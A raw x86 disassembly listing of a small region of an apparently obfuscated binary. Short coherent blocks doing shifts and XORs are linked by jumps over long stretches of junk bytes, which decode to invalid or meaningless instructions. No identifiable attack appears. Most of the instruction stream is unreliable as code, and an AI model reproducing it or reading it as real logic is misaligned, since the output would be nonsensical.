  413f7f:	lods   eax,DWORD PTR ds:[esi]
  413f80:	inc    esp
  413f81:	ja     0x413f7e
  413f83:	mov    bh,0x65
  413f85:	loopne 0x413f1f
  413f87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f88:	push   ebx
  413f89:	mov    al,0x8b
  413f8b:	(bad)  
  413f8d:	sub    eax,0xd6902300
  413f92:	jmp    0x3700:0x42ab88c9
  413f99:	mov    ecx,0x6d319536
  413f9e:	mov    edx,0x5eb42ad6
  413fa3:	cs inc ebx
  413fa5:	(bad)  
  413fa6:	popa   
  413fa7:	cdq    
  413fa8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413fa9:	mov    ebp,0x73a5bc04
  413fae:	or     al,0xd
  413fb0:	sbb    DWORD PTR [eax-0x17],ebp
  413fb3:	xor    al,0x19
  413fb5:	rol    ebp,cl
  413fb7:	adc    al,0x31
  413fb9:	or     esp,esi
  413fbb:	imul   DWORD PTR [eax+ebp*4-0x777779da]
  413fc2:	mov    edi,0x823e87c9
  413fc7:	test   eax,0xb6c39a52
  413fcc:	popf   
  413fcd:	and    al,0x13
  413fcf:	fistp  QWORD PTR [edi+ebp*8]
  413fd2:	jp     0x413fb9
  413fd4:	jle    0x413f7c
  413fd6:	pop    edx
  413fd7:	pmulhuw mm4,QWORD PTR [edi-0x7b]
  413fdb:	inc    ecx
  413fdc:	daa    
  413fdd:	cmp    DWORD PTR [ebp-0x7b],esp
  413fe0:	mov    dl,0x93
  413fe2:	rcr    ch,cl
  413fe4:	lds    ecx,FWORD PTR [esi]
  413fe6:	cmp    edx,ecx
  413fe8:	mov    ch,0xfa
  413fea:	sub    DWORD PTR [edi-0x7ecbbca3],edi
  413ff0:	push   ebx
  413ff1:	xchg   esi,eax
  413ff2:	inc    eax
  413ff3:	test   al,0xd6
  413ff5:	lock cmp edx,DWORD PTR [ebx+0x52809f13]
  413ffc:	(bad)  
  413ffd:	(bad)  
  413ffe:	dec    ecx
  413fff:	mov    ds:0x1fedcec1,al
  414004:	jle    0x413fc7
  414006:	je     0x413fe4
  414008:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414009:	ja     0x413fdd
  41400b:	int    0x72
  41400d:	mov    cl,0xa7
  41400f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414010:	cmp    BYTE PTR [esi+0x30],0xca
  414014:	inc    eax
  414015:	cmp    al,0x20
  414017:	es adc al,0x22
  41401a:	cs jge 0x414072
  41401d:	sar    BYTE PTR [edi+0x13],0xf9
  414021:	push   ds
  414022:	xor    BYTE PTR [ecx+0x1],al
  414025:	or     eax,0x561c6b3b
  41402a:	loopne 0x41406d
  41402c:	pop    esp
  41402d:	cmp    BYTE PTR [edx+eiz*4+0x226a6bde],dl
  414034:	ins    BYTE PTR es:[edi],dx
  414035:	pop    eax
  414036:	and    ah,BYTE PTR ds:0xf8a37d7c
  41403c:	pop    ecx
  41403d:	enter  0x8ce3,0xbb
  414041:	adc    ecx,DWORD PTR [esi-0x76100fb1]
  414047:	mov    edi,ecx
  414049:	sbb    dh,dl
  41404b:	cmp    al,0xab
  41404d:	xchg   eax,edi
  41404f:	stos   BYTE PTR es:[edi],al
  414050:	loop   0x414030
  414052:	test   al,0xfe
  414054:	xor    BYTE PTR [esi+0x3b],cl
  414057:	test   al,0x11
  414059:	imul   ebx,DWORD PTR [ebp+0x4b727665],0xffffffa1
  414060:	cmp    edi,0x3496237b
  414066:	sub    eax,0x116ad43f
  41406b:	mov    esp,edi
  41406d:	lea    edx,[ebp+eax*4+0x1da3f37]
  414074:	push   ebx
  414075:	je     0x413ffc
  414077:	mov    ds:0x104d8ba4,al
  41407c:	mov    edx,DWORD PTR [ebp+0x14]
  41407f:	xor    edx,edx
  414081:	shl    ecx,0x1e
  414084:	mov    ecx,DWORD PTR [ebp+0x10]
  414087:	xor    eax,esi
  414089:	or     eax,edx
  41408b:	mov    edx,DWORD PTR [ebp+0x14]
  41408e:	shrd   ecx,edx,0x2
  414092:	shr    edx,0x2
  414095:	mov    edx,DWORD PTR [ebp+0x10]
  414098:	mov    ebx,DWORD PTR [ebp+0x14]
  41409b:	xor    ecx,esi
  41409d:	xor    ebx,ebx
  41409f:	or     ecx,ebx
  4140a1:	shl    edx,0x1e
  4140a4:	jmp    0x4143dd
  4140a9:	pop    eax
  4140aa:	add    eax,0xb29872c6
  4140af:	jl     0x4140dc
  4140b1:	fisttp DWORD PTR [ecx-0x345f5b7a]
  4140b7:	mov    ah,BYTE PTR [ebx+ecx*2-0x1241416e]
  4140be:	les    edi,FWORD PTR [esi-0x9427042]
  4140c4:	xchg   ecx,eax
  4140c5:	inc    eax
  4140c6:	or     edx,DWORD PTR [esi+ebp*1+0x631dcd7]
  4140cd:	jg     0x414138
  4140cf:	outs   dx,BYTE PTR ds:[esi]
  4140d0:	mov    ds:0xd1219820,al
  4140d5:	push   ds
  4140d6:	arpl   WORD PTR [edi-0x79a1874],bp
  4140dc:	mov    esi,0x8f865db9
  4140e1:	aad    0x86
  4140e3:	gs aam 0x8e
  4140e6:	xor    DWORD PTR [esi+0x46625340],eax
  4140ec:	pop    es
  4140ed:	repz sub DWORD PTR [eax],esp
  4140f0:	xchg   ecx,eax
  4140f1:	adc    BYTE PTR [ebx-0x2184c458],cl
  4140f7:	sti    
  4140f8:	pop    ss
  4140f9:	fwait
  4140fa:	into   
  4140fb:	jbe    0x4140db
  4140fd:	push   ss
  4140fe:	out    dx,eax
  4140ff:	inc    ebx
  414100:	sub    BYTE PTR [edi-0x245473b],bl
  414106:	mov    dl,0x24
  414108:	xchg   esp,eax
  414109:	fsub   QWORD PTR [edx+edi*4+0x3b]
  41410d:	xchg   esp,eax
  41410e:	mov    al,ds:0xa3aff61a
  414113:	cmp    dh,BYTE PTR [ebx]
  414115:	xor    eax,0x9277488d
  41411a:	push   esi
  41411b:	sub    esp,edx
  41411d:	sahf   
  41411e:	scas   al,BYTE PTR es:[di]
  414120:	jge    0x4140cf
  414122:	lahf   
  414123:	sub    eax,DWORD PTR [edx]
  414125:	sub    al,0x6a
  414127:	sub    eax,0xe8475559
  41412c:	mov    bl,0x63
  41412e:	or     al,0x44
  414130:	mov    edi,0xab9260c5
  414135:	fisubr DWORD PTR [ebx]
  414137:	rcpps  xmm3,XMMWORD PTR [edx-0x78827ae0]
  41413e:	adc    dl,BYTE PTR [esi+0x1411c9c0]
  414144:	pop    edi
  414145:	clc    
  414146:	pop    ebp
  414147:	xchg   esi,eax
  414148:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414149:	mov    ebp,0x39e4430b
  41414e:	and    eax,0x7301730b
  414153:	xchg   ebp,eax
  414154:	(bad)  
  414155:	aad    0xe0
  414157:	out    0xa0,al
  414159:	and    al,0x77
  41415b:	out    0xde,al
  41415d:	lock cli 
  41415f:	cmp    DWORD PTR [edi],edx
  414161:	js     0x4141ab
  414163:	cmp    ebp,ebp
  414165:	outs   dx,DWORD PTR ds:[esi]
  414166:	add    ch,BYTE PTR [esi-0x2f]
  414169:	(bad)  
  41416a:	lea    esi,[edx+0x2d]
  41416d:	inc    esp
  41416e:	das    
  41416f:	clc    
  414170:	xchg   ebx,eax
  414171:	fld    DWORD PTR [edi]
  414173:	nop
  414174:	dec    esp
  414175:	jb     0x41419a
  414177:	loop   0x414189
  414179:	dec    esp
  41417a:	xor    al,0x80
  41417c:	enter  0xe3f4,0x80
  414180:	nop
  414181:	push   esp
  414182:	aas    
  414183:	fcomp  st(0)
  414185:	inc    eax
  414186:	fwait
  414187:	stos   DWORD PTR es:[edi],eax
  414188:	test   DWORD PTR [edi],eax
  41418a:	sar    BYTE PTR [ecx+0x73],cl
  41418d:	jne    0x414209
  41418f:	(bad)  
  414190:	call   0xa58b3706
  414195:	js     0x41413f
  414197:	mov    WORD PTR [ebx+0x4998c11],es
  41419d:	pop    esp
  41419e:	popa   
  41419f:	cmp    ecx,DWORD PTR [ecx-0x27]
  4141a2:	jae    0x414203
  4141a4:	cmp    DWORD PTR [edi-0x16],esi
  4141a7:	and    eax,0x37e31174
  4141ac:	mov    ah,0x71
  4141ae:	and    ecx,DWORD PTR [ebx+esi*1+0x75]
  4141b2:	pop    ss
  4141b3:	inc    ebx
  4141b4:	mov    eax,0xef24d8b1
  4141b9:	pop    ebx
  4141ba:	scas   eax,DWORD PTR es:[edi]
  4141bb:	out    0x8d,al
  4141bd:	inc    esi
  4141be:	pop    edi
  4141bf:	addr16 cwde 
  4141c1:	ins    WORD PTR es:[edi],dx
  4141c3:	lahf   
  4141c4:	or     al,0xf4
  4141c6:	jno    0x414177
  4141c8:	(bad)  
  4141c9:	pusha  
  4141ca:	inc    ebx
  4141cb:	sbb    eax,0x2b0abb00
  4141d0:	lds    edi,FWORD PTR [esi+0x1be0712b]
  4141d6:	xor    esp,DWORD PTR [ecx+eiz*4-0x2ddb1edf]
  4141dd:	std    
  4141de:	ins    DWORD PTR es:[edi],dx
  4141df:	call   0x9558:0xd0b45a2
  4141e6:	rcl    BYTE PTR [edx+0x5e2de99a],1
  4141ec:	push   cs
  4141ed:	pushf  
  4141ee:	mov    esi,0xbc2555a8
  4141f3:	sub    bh,BYTE PTR [eax+ecx*1-0x44]
  4141f7:	jmp    edi
  4141f9:	mov    ds:0xb314d7fe,al
  4141fe:	inc    ebp
  4141ff:	add    ebx,DWORD PTR [edx]
  414201:	or     eax,DWORD PTR [edi-0x7]
  414204:	(bad)  
  414205:	std    
  414206:	scas   eax,DWORD PTR es:[edi]
  414207:	inc    ebx
  414208:	adc    ah,bh
  41420a:	popa   
  41420b:	xor    eax,0x700d6816
  414210:	xchg   edx,eax
  414211:	add    al,0x95
  414213:	and    al,0x6a
  414215:	xchg   BYTE PTR ds:0xfad84c22,ah
  41421b:	push   ecx
  41421c:	jg     0x4141d5
  41421e:	jecxz  0x4141e9
  414220:	mov    WORD PTR [ecx],ds
  414222:	adc    al,0x5d
  414224:	pop    ss
  414225:	push   ss
  414226:	jmp    0xcd892ebf
  41422b:	test   DWORD PTR [eax-0x32a4613f],eax
  414231:	out    dx,eax
  414232:	push   ds
  414233:	mov    edx,0x43916077
  414238:	mov    ch,0x42
  41423a:	cvtpi2ps xmm4,mm7
  41423d:	jbe    0x4141d9
  41423f:	mov    ecx,0xb93487ad
  414244:	xlat   BYTE PTR ds:[ebx]
  414245:	push   ss
  414246:	fs iret 
  414248:	in     al,0xc5
  41424a:	sbb    DWORD PTR ds:0xaa33a768,ebp
  414250:	xor    ebp,ecx
  414252:	bound  ebp,QWORD PTR [edi-0x3c4e1712]
  414258:	fnstenv [eax]
  41425a:	ret    0x8574
  41425d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41425e:	lds    eax,FWORD PTR [ebp+0x74]
  414261:	and    BYTE PTR [eax],ch
  414263:	imul   ecx,DWORD PTR [edx+0x4],0x73
  414267:	jmp    0x24772d21
  41426c:	fcom   QWORD PTR [esi]
  41426e:	sbb    esi,DWORD PTR [eax+0xd]
  414271:	and    edi,edi
  414273:	mov    ds:0xf571b8c,eax
  414278:	mov    dl,0xec
  41427a:	add    eax,ebx
  41427c:	mov    bl,0xf8
  41427e:	dec    eax
  41427f:	dec    edx
  414280:	mov    eax,ds:0xe15e8590
  414285:	xchg   esp,eax
  414286:	xor    al,BYTE PTR [eax+0x327ba888]
  41428c:	popf   
  41428d:	xchg   esi,eax
  41428e:	bound  ebp,QWORD PTR [edi-0x226df28a]
  414294:	push   0xffffff80
  414296:	aam    0x6e
  414298:	sub    ah,BYTE PTR [ebp+ebp*1-0x6752f9c2]
  41429f:	out    0x4f,eax
  4142a1:	das    
  4142a2:	adc    esp,0x55
  4142a5:	adc    al,BYTE PTR ds:0xfe87ac14
  4142ab:	in     al,0x15
  4142ad:	xor    DWORD PTR [eax+0x4eab3722],ebx
  4142b3:	push   ss
  4142b4:	fistp  QWORD PTR [ebx-0x4b]
  4142b7:	call   0x78fd6ab6
  4142bc:	aaa    
  4142bd:	dec    eax
  4142be:	sub    cl,bl
  4142c0:	stc    
  4142c1:	cmp    ecx,DWORD PTR [eax-0x7b]
  4142c4:	pop    ds
  4142c5:	in     al,0x59
  4142c7:	inc    esi
  4142c8:	(bad)  
  4142c9:	fst    st(6)
  4142cb:	jnp    0x4142fd
  4142cd:	mov    ebp,0x5d6f5f8a
  4142d2:	and    eax,0x6731bea0
  4142d7:	(bad)  
  4142d8:	push   ecx
  4142d9:	mov    al,ds:0x5008475b
  4142de:	pop    WORD PTR [esp+eax*4-0x6488f465]
  4142e6:	sbb    BYTE PTR [ebp+0x10c24510],0xe8
  4142ed:	mov    ebp,0x70f735da
  4142f2:	xchg   edi,eax
  4142f3:	sbb    al,BYTE PTR [ebp+0x46]
  4142f6:	mov    eax,eax
  4142f8:	fimul  WORD PTR [eax+0x25aa0c5c]
  4142fe:	mov    esp,0x749ddba5
  414303:	mov    ah,BYTE PTR [edx]
  414305:	sub    DWORD PTR [ecx-0x71],edx
  414308:	das    
  414309:	fwait
  41430a:	ret    
  41430b:	popa   
  41430c:	loopne 0x4142f8
  41430e:	mov    edx,DWORD PTR [ebp+ebx*4+0x6016f5ad]
  414315:	pop    ss
  414316:	sub    al,BYTE PTR [edx+eax*8]
  414319:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41431a:	xchg   esp,eax
  41431b:	mov    ch,0x5e
  41431d:	push   es
  41431e:	(bad)  
  41431f:	cmp    ah,al
  414321:	ja     0x414394
  414323:	cmp    edi,DWORD PTR [edi]
  414325:	mov    edi,0xcada5130
  41432a:	or     al,BYTE PTR [edi]
  41432c:	les    esp,FWORD PTR [ebp-0x6ba0cde4]
  414332:	sbb    DWORD PTR [ebx+0x45eb28ca],esi
  414338:	add    al,0x5e
  41433a:	loop   0x41431f
  41433c:	dec    ebp
  41433d:	int    0x25
  41433f:	inc    eax
  414340:	cld    
  414341:	sbb    DWORD PTR [eax-0x1d],ecx
  414344:	push   0xffffff9d
  414346:	(bad)  
  414348:	arpl   WORD PTR [ebx+eiz*2+0x34e64b22],sp
  41434f:	fwait
  414350:	retf   
  414351:	push   ebx
  414352:	push   ss
  414353:	mov    cl,0xed
  414355:	mov    DWORD PTR ds:0x209a5d0a,ecx
  41435b:	xlat   BYTE PTR gs:[ebx]
  41435d:	cmp    ebx,DWORD PTR [edi+0x5a]
  414360:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414361:	fcom   QWORD PTR [esi-0x1e321eba]
  414367:	lock lods eax,DWORD PTR cs:[esi]
  41436a:	pop    ecx
  41436b:	mov    ebx,0x4fb86c10
  414370:	push   ebx
  414371:	sub    BYTE PTR [ebx-0x7e010631],bh
  414377:	popa   
  414378:	mov    ah,0x60
  41437a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41437b:	stos   DWORD PTR es:[edi],eax
  41437c:	pop    esp
  41437d:	jne    0x414352
  41437f:	dec    ecx
  414380:	fdivr  DWORD PTR [esi+0x34c81c66]
  414386:	or     DWORD PTR [eax-0x50],ebp
  414389:	cli    
  41438a:	aad    0xe2
  41438c:	in     eax,dx
  41438d:	stc    
  41438e:	bound  ecx,QWORD PTR [eax+0x7a]
  414391:	ficomp DWORD PTR [ebx-0x394cde38]
  414397:	push   es
  414398:	stos   BYTE PTR es:[edi],al
  414399:	dec    ebx
  41439a:	xchg   BYTE PTR [esi-0x5a32249e],dl
  4143a0:	neg    cl
  4143a2:	test   BYTE PTR ds:0x4b801cad,0x38
  4143a9:	push   cs
  4143aa:	push   es
  4143ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4143ac:	and    al,0x38
  4143ae:	test   eax,0xd863618c
  4143b3:	jb     0x41440b
  4143b5:	inc    ecx
  4143b6:	and    dh,dl
  4143b8:	in     al,dx
  4143b9:	mov    ds:0xf7c00a18,eax
  4143be:	sbb    ebp,0x84309b9b
  4143c4:	call   0xd4462524
  4143c9:	mov    eax,0xb69e374b
  4143ce:	pcmpgtd mm3,QWORD PTR [eax]
  4143d1:	inc    eax
  4143d2:	popf   
  4143d3:	shr    BYTE PTR [edi+0xa62ed72],1
  4143d9:	and    al,0xff
  4143db:	xchg   edi,eax
  4143dc:	retf   
  4143dd:	add    eax,ecx
  4143df:	mov    ecx,DWORD PTR [ebp+0x10]
  4143e2:	mov    edx,DWORD PTR [ebp+0x14]
  4143e5:	shrd   ecx,edx,0x2
  4143e9:	shr    edx,0x2
  4143ec:	xor    ecx,esi
  4143ee:	jmp    0x414727
  4143f3:	cmp    eax,0xb8c710f5
  4143f8:	sub    BYTE PTR [ebp+0x76acc878],dl
  4143fe:	xchg   edx,eax
  4143ff:	push   eax
  414400:	gs clc 
  414402:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414403:	jnp    0x41439d
  414405:	mov    esi,0xbec4edbe
  41440a:	mov    esi,0x93a356cf
  41440f:	sbb    al,0x62
  414411:	xchg   edx,eax
  414412:	test   al,0xf7
  414414:	sub    eax,0x292abd01
  414419:	iret   
  41441a:	xchg   ebp,eax
  41441b:	test   esp,ebp
  41441d:	popf   
  41441e:	lods   al,BYTE PTR ds:[esi]
  41441f:	mov    esp,0x717efdb9
  414424:	push   0xffffffb5
  414426:	adc    BYTE PTR [ebx-0x53],0x39
  41442a:	cmp    edi,eax
  41442c:	test   DWORD PTR gs:[ebx],esi
  41442f:	jb     0x41442a
  414431:	(bad)
  414434:	add    dl,BYTE PTR [edx+edi*2-0x70]
  414438:	ja     0x414421
  41443a:	mov    edx,0x291429c4
  41443f:	xor    ecx,edi
  414441:	cmp    al,0x6c
  414443:	push   ebx
  414444:	sub    eax,0xf7e9cce6
  414449:	inc    ebx
  41444a:	mov    al,0x11
  41444c:	in     al,0x6a
  41444e:	adc    al,0xa8
  414450:	pop    ecx
  414451:	adc    cl,cl
  414453:	push   esi
  414454:	mov    esp,0x8d7e0c74
  414459:	shr    DWORD PTR [esi+0xc],cl
  41445c:	fistp  QWORD PTR [edx-0x78]
  41445f:	pop    esp
  414460:	and    DWORD PTR [esi-0x36],esi
  414463:	xchg   BYTE PTR ds:0x4ddd9dfa,bh
  414469:	cs mov ah,0x77
  41446c:	dec    ecx
  41446d:	mov    edi,0xe54331a3
  414472:	dec    esi
  414473:	or     al,0x44
  414475:	arpl   WORD PTR [ecx+0x5ea1a218],sp
  41447b:	idiv   BYTE PTR [eax-0x12]
  41447e:	inc    edx
  41447f:	leave  
  414480:	jnp    0x414442
  414482:	pop    esi
  414483:	leave  
  414484:	or     esi,DWORD PTR [bx+di-0x62]
  414488:	push   esp
  414489:	imul   ebx,esi,0xffffffa7
  41448c:	pop    ebx
  41448d:	sti    
  41448e:	outs   dx,BYTE PTR ds:[esi]
  41448f:	in     eax,0x58
  414491:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414492:	imul   edx,ecx,0x4a50ed1c
  414498:	lods   al,BYTE PTR ds:[esi]
  414499:	xor    BYTE PTR ds:0xbe7fe3c1,ch
  41449f:	add    DWORD PTR [edi],ebx
  4144a1:	xchg   ebp,eax
  4144a2:	mov    es,WORD PTR [esi+0x0]
  4144a5:	or     DWORD PTR [esi],esi
  4144a7:	test   DWORD PTR [edx-0x10],0xe32d0feb
  4144ae:	cmp    al,0xb
  4144b0:	and    BYTE PTR [ecx-0x4b],ch
  4144b3:	adc    DWORD PTR [ebp+0x5229fcb7],0x8cd2f396
  4144bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4144bf:	jne    0x4144df
  4144c1:	pop    ss
  4144c2:	mov    al,ds:0x295572c1
  4144c7:	pop    ebx
  4144c8:	mov    edi,0x58666f4c
  4144cd:	mov    eax,ds:0x7ed8a4d
  4144d2:	in     al,dx
  4144d3:	fisttp WORD PTR [ebx]
  4144d5:	adc    bh,BYTE PTR [ecx+0x2b9ca9ea]
  4144db:	mov    dl,ch
  4144dd:	xchg   BYTE PTR [eax-0x52],ah
  4144e0:	ret    
  4144e1:	sbb    esi,ebx
  4144e3:	test   dh,bh
  4144e5:	inc    ebp
  4144e6:	sar    esi,1
  4144e8:	mov    al,0xab
  4144ea:	enter  0x94e1,0x48
  4144ee:	aaa    
  4144ef:	jns    0x41451f
  4144f1:	fwait
  4144f2:	dec    ecx
  4144f3:	mov    ds:0x10025528,eax
  4144f8:	rcl    cl,1
  4144fa:	xchg   edi,eax
  4144fb:	pop    ds
  4144fc:	cmp    bl,BYTE PTR [esi+edx*8-0x2a]
  414500:	inc    edx
  414501:	xchg   esp,eax
  414502:	mov    BYTE PTR [edx],ch
  414504:	push   es
  414505:	dec    ebx
  414506:	outs   dx,BYTE PTR ds:[esi]
  414507:	int3   
  414508:	pop    esi
  414509:	lds    ebx,FWORD PTR [esi]
  41450b:	scas   al,BYTE PTR es:[edi]
  41450c:	and    ebp,DWORD PTR [ecx+0x40513390]
  414512:	mov    DWORD PTR [ebx+esi*4+0x77],edi
  414516:	sub    DWORD PTR [esi-0x1a177385],ebx
  41451c:	pop    es
  41451d:	scas   al,BYTE PTR es:[edi]
  41451e:	fwait
  41451f:	sbb    bl,bl
  414521:	xlat   BYTE PTR ds:[ebx]
  414522:	out    0xf1,eax
  414524:	xchg   edx,eax
  414525:	xor    bl,BYTE PTR [esi]
  414527:	arpl   sp,dx
  414529:	mov    es,WORD PTR [ebx-0xb16f703]
  41452f:	lahf   
  414530:	cmp    eax,0x98c9dd8f
  414535:	not    BYTE PTR [ebx+0x54]
  414538:	fbstp  TBYTE PTR [edi+eiz*2]
  41453b:	mov    dl,0x8c
  41453d:	lea    esp,[ebx-0xd70eedb]
  414543:	mov    ah,0xa4
  414545:	stos   DWORD PTR es:[edi],eax
  414546:	loop   0x41450e
  414548:	mov    edx,0x3e274d60
  41454d:	fnsave [ebp-0x3fb4e05e]
  414553:	and    DWORD PTR [edi+0x4c143863],edx
  414559:	mov    WORD PTR [esi-0x6eb3b62a],gs
  41455f:	xchg   ecx,eax
  414560:	mov    al,0x15
  414562:	sub    DWORD PTR [edi],ebx
  414564:	neg    dh
  414566:	ja     0x414561
  414568:	stos   BYTE PTR es:[edi],al
  414569:	call   0x1a6a89b9
  41456e:	cs mov esi,edi
  414571:	out    dx,eax
  414572:	dec    edi
  414573:	sbb    BYTE PTR [ebp-0x61],cl
  414576:	pop    ebp
  414577:	sbb    DWORD PTR [ecx],ebp
  414579:	int3   
  41457a:	cmp    al,BYTE PTR [ecx+0x21187fe1]
  414580:	test   al,0xfb
  414582:	enter  0x2c06,0x15
  414586:	mov    al,0x3c
  414588:	(bad)  
  414589:	loop   0x4145a4
  41458b:	bound  edx,QWORD PTR [ecx+ebp*2-0x21576865]
  414592:	or     BYTE PTR ds:0x6ef19b79,ch
  414598:	rcr    ch,1
  41459a:	mov    ebx,0x13d3ff99
  41459f:	mov    al,ds:0x5e62b591
  4145a4:	xchg   ecx,eax
  4145a5:	pop    edx
  4145a6:	ins    DWORD PTR es:[edi],dx
  4145a7:	cmc    
  4145a8:	cmc    
  4145a9:	xor    ebp,DWORD PTR [ebp-0x64]
  4145ac:	pop    ebp
  4145ad:	pop    ebp
  4145ae:	outs   dx,DWORD PTR ds:[esi]
  4145af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4145b0:	sbb    edx,ebp
  4145b2:	call   0xf683fb9a
  4145b7:	push   ebx
  4145b8:	iret   
  4145b9:	out    0xb9,eax
  4145bb:	jb     0x414569
  4145bd:	scas   al,BYTE PTR es:[edi]
  4145be:	pop    esp
  4145bf:	add    eax,0x3bc10710
  4145c4:	outs   dx,DWORD PTR ds:[esi]
  4145c5:	lods   eax,DWORD PTR ds:[esi]
  4145c6:	addr16 push es
  4145c8:	pop    ecx
  4145c9:	sub    cl,BYTE PTR [ecx]
  4145cb:	out    0x39,eax
  4145cd:	call   0xcb4a:0x111dd7bc
  4145d4:	and    BYTE PTR [ecx],dh
  4145d6:	xchg   esp,eax
  4145d7:	(bad)  
  4145d8:	in     al,dx
  4145d9:	and    edx,DWORD PTR [eax+ebx*2-0x27]
  4145dd:	sahf   
  4145de:	ret    0x4e7b
  4145e1:	lods   eax,DWORD PTR ds:[esi]
  4145e2:	out    0x25,al
  4145e4:	dec    edi
  4145e5:	fld    QWORD PTR [ebp+0x5d]
  4145e8:	or     al,0x89
  4145ea:	cwde   
  4145eb:	add    eax,DWORD PTR [eax+0x9]
  4145ee:	pop    esp
  4145ef:	mov    esi,0xf2610b53
  4145f4:	pop    edi
  4145f5:	mov    edx,0xf13f67fa
  4145fa:	imul   ebp,esi,0xffffffbe
  4145fd:	imul   ebp,esi,0x7d
  414600:	fld    QWORD PTR [edi]
  414602:	(bad)  [ebx+eax*8-0x48363203]
  414609:	sub    DWORD PTR [ebp+0x7645987c],edx
  41460f:	stos   DWORD PTR es:[edi],eax
  414610:	and    ch,dl
  414612:	stos   BYTE PTR es:[edi],al
  414613:	mov    ds:0x68528453,eax
  414618:	out    0x71,al
  41461a:	les    ecx,FWORD PTR [edi]
  41461c:	mov    dh,0x7f
  41461e:	mov    eax,?
  414620:	push   ebx
  414621:	mov    WORD PTR [ebp+0x7f],es
  414624:	mov    ebp,ds
  414626:	mov    ch,0xc9
  414628:	jmp    DWORD PTR [esi]
  41462a:	icebp  
  41462b:	dec    edi
  41462c:	xor    eax,0x30df1ab5
  414631:	js     0x41468f
  414633:	pop    ecx
  414634:	pop    es
  414635:	aas    
  414636:	xchg   ebx,eax
  414637:	push   cs
  414638:	sar    BYTE PTR [ebx+0x5e435cd2],cl
  41463e:	rsqrtps xmm3,xmm0
  414641:	sbb    dh,ch
  414643:	ins    BYTE PTR es:[edi],dx
  414644:	jecxz  0x41466c
  414646:	mov    BYTE PTR [esi-0x57],bl
  414649:	pop    ds
  41464a:	push   ebp
  41464b:	imul   ebp,DWORD PTR [ecx+ebp*1],0xffffffbc
  41464f:	loope  0x4146b5
  414651:	bound  ecx,QWORD PTR [ecx+0x38792e1d]
  414657:	push   eax
  414658:	fcomi  st,st(0)
  41465a:	jmp    0x4146a2
  41465c:	mov    BYTE PTR [edi+eax*8-0x1e],al
  414660:	cwde   
  414661:	hlt    
  414662:	(bad)  
  414663:	pop    DWORD PTR [ebx+ebx*2-0x8581cff]
  41466a:	xor    al,0x3a
  41466c:	pushf  
  41466d:	sub    edx,eax
  41466f:	push   0x93314fa5
  414674:	sub    DWORD PTR [edi],0x84539b2b
  41467a:	sbb    ax,WORD PTR [edx]
  41467d:	stos   BYTE PTR es:[edi],al
  41467e:	mov    esp,0x96ae6412
  414683:	cld    
  414684:	and    esi,DWORD PTR [ebp+0x3a]
  414687:	in     eax,dx
  414688:	ds inc edi
  41468a:	pop    ds
  41468b:	or     eax,0x824ec19
  414690:	pop    ebp
  414691:	mov    ebx,0x1ebdebdb
  414696:	shl    DWORD PTR [ecx-0x26],0xff
  41469a:	inc    ebx
  41469b:	lock retf 0x1128
  41469f:	mov    ?,edi
  4146a1:	sbb    BYTE PTR [ebx],0x6f
  4146a4:	into   
  4146a5:	mov    dl,BYTE PTR [ecx+0x394cbe31]
  4146ab:	and    DWORD PTR [bp+di-0x26e8],ecx
  4146b0:	out    0x49,eax
  4146b2:	ins    BYTE PTR es:[edi],dx
  4146b3:	fst    QWORD PTR [ebp+0x73]
  4146b6:	and    eax,DWORD PTR [edi+0x52]
  4146b9:	div    ecx
  4146bb:	jmp    FWORD PTR [esi-0x66e01675]
  4146c1:	jmp    0x11c4:0xcc4aac9c
  4146c8:	cli    
  4146c9:	aas    
  4146ca:	in     al,dx
  4146cb:	pusha  
  4146cc:	cs pop ebx
  4146ce:	mov    dl,0x51
  4146d0:	cdq    
  4146d1:	xor    cl,0x2b
  4146d4:	xor    al,0x48
  4146d6:	xchg   bh,ah
  4146d8:	adc    eax,0x2e84d0e
  4146dd:	xor    BYTE PTR [esi+0x2d],bh
  4146e0:	int3   
  4146e1:	add    al,BYTE PTR [edi]
  4146e3:	aas    
  4146e4:	cs out dx,al
  4146e6:	sub    al,BYTE PTR [eax+0x4b553852]
  4146ec:	sub    cl,BYTE PTR [ecx-0x11]
  4146ef:	cwde   
  4146f0:	gs push 0xffffffdc
  4146f3:	cmp    BYTE PTR [edx],al
  4146f5:	pop    esi
  4146f6:	dec    esp
  4146f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4146f8:	aad    0xf7
  4146fa:	push   ebp
  4146fb:	aaa    
  4146fc:	inc    edi
  4146fd:	ror    DWORD PTR [esi+0x5e],0xec
  414701:	popa   
  414702:	cld    
  414703:	adc    dh,bl
  414705:	stos   BYTE PTR es:[edi],al
  414706:	or     ecx,esp
  414708:	mov    dh,BYTE PTR [edx+0xc8dff5c]
  41470e:	xchg   edi,eax
  414710:	ret    0x45eb
  414713:	mov    esp,0x74909278
  414718:	js     0x414784
  41471a:	bound  eax,QWORD PTR [edi]
  41471c:	pop    ss
  41471d:	pop    es
  41471e:	sub    DWORD PTR [ecx],esi
  414720:	push   eax
  414721:	leave  
  414722:	sub    dh,BYTE PTR [edx+0x69]
  414725:	jns    0x4146c6
  414727:	mov    edx,DWORD PTR [ebp+0x10]
  41472a:	mov    ebx,DWORD PTR [ebp+0x14]
  41472d:	xor    ebx,ebx
  41472f:	or     ecx,ebx
  414731:	add    eax,ecx
  414733:	lea    eax,[ebp+eax*4-0x7c]
  414737:	push   eax
  414738:	shl    edx,0x1e
  41473b:	call   0x411c08
  414740:	mov    eax,DWORD PTR [ebp-0x80]
  414743:	mov    ecx,DWORD PTR [ebp-0x80]
  414746:	xor    eax,edi
  414748:	xor    ecx,0xfffffffe
  41474b:	shr    eax,0x2
  41474e:	shl    ecx,0x1e
  414751:	or     ecx,eax
